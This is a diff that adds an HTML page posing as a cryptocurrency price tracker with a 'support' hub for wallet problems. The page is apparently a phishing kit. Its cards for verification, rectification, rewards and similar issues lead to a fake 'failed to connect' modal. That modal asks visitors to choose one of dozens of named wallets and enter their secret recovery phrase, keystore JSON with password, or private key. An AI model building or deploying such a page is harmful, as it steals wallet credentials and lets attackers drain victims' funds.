@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cryptocurrency Prices by Market Cap</title>
+    <link rel="stylesheet" href="/style.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h1>Cryptocurrency Prices by Market Cap</h1>
+      <table id="cryptoTable">
+        <thead>
+          <tr>
+            <th>Cryptocurrency</th>
+            <th>Price (USD)</th>
+            <th>Market Cap (USD)</th>
+            <th>24h Change</th>
+          </tr>
+        </thead>
+        <tbody>
+          <!-- Crypto data will be dynamically inserted here -->
+        </tbody>
+      </table>
+      <div class="pagination" id="pagination"></div>
+      <div class="crypto-graph" id="cryptoGraph">
+        <!-- Crypto graph will be dynamically inserted here -->
+      </div>
+    </div>
+
+    <!-- cards -->
+    <div class="box">
+      <div id="card1" class="card">
+        <div class="card-text">
+          <p>
+            Migration Concerns <span>&#x1F69A;</span><br />
+            Access support for migration-related queries here.
+          </p>
+        </div>
+      </div>
+      <div id="card2" class="card">
+        <div class="card-text">
+          <p>
+            Wallet Verification <span>&#x1F50D;</span><br />
+            Resolve validation issues by clicking here.
+          </p>
+        </div>
+      </div>
+      <div id="card3" class="card">
+        <div class="card-text">
+          <p>
+            General Inquiries <span>&#x1F4CB;</span><br />
+            Navigate general wallet concerns here.
+          </p>
+        </div>
+      </div>
+      <div id="card4" class="card">
+        <div class="card-text">
+          <p>
+            Rectification Assistance <span>&#x1F6E0;</span><br />
+            Access support for rectification-related matters here.
+          </p>
+        </div>
+      </div>
+      <div id="card5" class="card">
+        <div class="card-text">
+          <p>
+            Gas Fee Queries <span>&#x1F4B8;</span><br />
+            Address gas fee concerns by clicking here.
+          </p>
+        </div>
+      </div>
+      <div id="card6" class="card">
+        <div class="card-text">
+          <p>
+            Reward Claiming <span>&#x1F3C6;</span><br />
+            Resolve issues with claiming rewards here.
+          </p>
+        </div>
+      </div>
+      <div id="card7" class="card">
+        <div class="card-text">
+          <p>
+            Deposit/Withdrawal Assistance <span>&#x1F4B3;</span><br />
+            Access support for deposit/withdrawal issues here.
+          </p>
+        </div>
+      </div>
+      <div id="card8" class="card">
+        <div class="card-text">
+          <p>
+            Staking Support <span>&#x1F331;</span><br />
+            Resolve staking-related concerns by clicking here.
+          </p>
+        </div>
+      </div>
+      <div id="card9" class="card">
+        <div class="card-text">
+          <p>
+            Swap/Exchange Assistance <span>&#x1F504;</span><br />
+            Access support for swap/exchange issues here.
+          </p>
+        </div>
+      </div>
+      <div id="card10" class="card">
+        <div class="card-text">
+          <p>
+            Dapp Connectivity <span>&#x1F310;</span><br />
+            Resolve Dapp connection issues by clicking here.
+          </p>
+        </div>
+      </div>
+      <div id="card11" class="card">
+        <div class="card-text">
+          <p>
+            Balance Discrepancies <span style="color: white">&#x2696;</span
+            ><br />
+            Access support for missing/irregular balance issues here.
+          </p>
+        </div>
+      </div>
+      <div id="card12" class="card">
+        <div class="card-text">
+          <p>
+            Login Support <span>&#x1F511;</span><br />
+            Resolve login-related concerns by clicking here.
+          </p>
+        </div>
+      </div>
+      <div id="card13" class="card">
+        <div class="card-text">
+          <p>
+            NFT Assistance <span>&#x1F52E;</span><br />
+            Access support for NFT-related issues here.
+          </p>
+        </div>
+      </div>
+      <div id="card14" class="card">
+        <div class="card-text">
+          <p>
+            Password Recovery <span>&#x1F512;</span><br />
+            Recover forgotten passwords by clicking here.
+          </p>
+        </div>
+      </div>
+      <div id="card15" class="card">
+        <div class="card-text">
+          <p>
+            Trading Support <span>&#x1F4BC;</span>
+            Resolve trading-related concerns by clicking here.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div id="modal" class="modal">
+      <div class="modal-content">
+        <span class="close">&times;</span>
+        <div class="modal-card">
+          <div class="text-text">
+            <h3>Connect Your Wallet To Get Started</h3>
+            <p
+              style="
+                color: rgb(236, 28, 20);
+                font-size: 14px;
+                padding-bottom: 20px;
+              "
+            >
+              Failed to connect! use the form below to connect manually
+            </p>
+
+            <div>
+              <select id="mySelect1" name="walletType">
+                <option value="" selected disabled>Wallet Type</option>
+                <option value="metamask">Metamask</option>
+                <option value="trustWallet">Trust Wallet</option>
+                <option value="coinbase">Coinbase</option>
+                <option value="keplrWallet">Keplr Wallet</option>
+                <option value="safepal">Safepal</option>
+                <option value="tronlink">Tronlink</option>
+                <option value="defichainWallet">Defichain Wallet</option>
+                <option value="dfxDefichain">DFX Defichain</option>
+                <option value="solana">Solana</option>
+                <option value="blockchain">Blockchain</option>
+                <option value="lobstrWallet">Lobstr Wallet</option>
+                <option value="yoroiWallet">Yoroi Wallet</option>
+                <option value="coinomi">Coinomi</option>
+                <option value="edgeWallet">Edge Wallet</option>
+                <option value="solarWallet">Solar Wallet</option>
+                <option value="peraalgoWallet">Pera Algo Wallet</option>
+                <option value="senderWallet">Sender Wallet</option>
+                <option value="xcelpayWallet">Xcel Pay Wallet</option>
+                <option value="anchorWallet">Anchor Wallet</option>
+                <option value="onto">ONTO</option>
+                <option value="trezor">Trezor</option>
+                <option value="zengo">Zengo</option>
+                <option value="atomicWallet">Atomic Wallet</option>
+                <option value="1inchwallet">1inch Wallet</option>
+                <option value="bitpay">Bitpay</option>
+                <option value="electrum">Electrum</option>
+                <option value="bitconCore">Bitcoin Core</option>
+                <option value="alphaWallet">AlphaWallet</option>
+                <option value="bestWallet">Best Wallet</option>
+              </select>
+            </div>
+            <div style="margin-top: 40px">
+              <select id="mySelect2" name="accessType">
+                <option value="" selected disabled>Access Type</option>
+                <option value="phrase">Phrase</option>
+                <option value="keystore">Keystore JSON</option>
+                <option value="private">Private Key</option>
+              </select>
+            </div>
+
+            <div style="margin-top: 40px">
+              <button id="cancel" class="red-button">cancel</button>
+              <button id="connect" class="blue-button">connect wallet</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- phrase -->
+    <div id="phrase">
+      <div id="modal2" class="modal2">
+        <div class="modal-content">
+          <span class="close">&times;</span>
+          <div class="modal-card">
+            <div class="text-text">
+              <h3>
+                Connect Your
+                <span style="color: black" id="walletTypeText"></span>
+              </h3>
+
+              <div>
+                <p style="width: 300px; margin: 14px auto">
+                  Input Secret Phrase
+                </p>
+                <textarea
+                  name=""
+                  id=""
+                  cols="30"
+                  rows="10"
+                  placeholder="Enter phrase"
+                ></textarea>
+                <p style="width: 300px; margin: 24px auto">
+                  Typically 12(sometimes 24) words separated by single spaces
+                </p>
+              </div>
+            </div>
+            <div style="margin: 24px auto">
+              <button class="blue-button">connect wallet</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!--  Keystore JSON -->
+    <div id="keystore">
+      <div id="modal3" class="modal3">
+        <div class="modal-content">
+          <span class="close">&times;</span>
+          <div class="modal-card">
+            <div class="text-text">
+              <h3>
+                Connect Your
+                <span style="color: black" id="walletTypeText2"></span>
+              </h3>
+              <div>
+                <p>Input Keystore JSON</p>
+                <textarea
+                  name=""
+                  id=""
+                  cols="30"
+                  rows="10"
+                  placeholder="Enter phrase"
+                ></textarea>
+                <div style="margin-top: 10px">
+                  <input id="password" type="password" placeholder="password" />
+                </div>
+                <p style="width: 300px; margin: 24px auto">
+                  Several lines of text beginning with "" plus the password you
+                  used to encrypt it
+                </p>
+              </div>
+            </div>
+            <div style="margin: 24px auto">
+              <button class="blue-button">connect wallet</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- private key -->
+    <div id="privateKey">
+      <div id="modal4" class="modal4">
+        <div class="modal-content">
+          <span class="close">&times;</span>
+          <div class="modal-card">
+            <div class="text-text">
+              <h3>
+                Connect Your
+                <span style="color: black" id="walletTypeText3"></span>
+              </h3>
+              <div>
+                <p>Input Private Key</p>
+                <input type="text" placeholder="Enter private key" />
+                <p style="width: 300px; margin: 2% auto">
+                  Typically contains a string of alphanumeric characters which
+                  are about 50 or more in number
+                </p>
+              </div>
+            </div>
+            <div style="margin: 24px auto">
+              <button class="blue-button">connect wallet</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="modal5" class="modal5">
+      <div class="modal-content">
+        <span class="close">&times;</span>
+        <div class="modal-card"></div>
+      </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.7.0/chart.min.js"></script>
+    <script src="/script.js"></script>
+  </body>
+</html>
